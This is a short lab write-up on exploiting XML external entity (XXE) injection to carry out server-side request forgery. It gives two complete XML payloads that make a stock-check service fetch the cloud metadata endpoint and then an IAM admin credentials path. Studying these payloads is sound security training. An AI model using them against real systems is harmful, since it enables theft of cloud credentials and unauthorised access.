# Exploiting XXE to perform SSRF attacks

Same application as in [[Lab 1]] this time the resource to be parsed by the external entity is: `http://169.254.169.254/`

So the payload will be 
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
	<productId>
	&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

The application retrieves:

![[strange.png]]

It took me a while to understand the `latest`, but checking [this](https://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/instancedata-data-retrieval.html) resource it was clear that the server was responding with the directory listing, following the path of each response, the following payload will solve the lab.

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
	<productId>
	&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

![[XXE/Labs/XXE2SSRF/images/exploited.png]]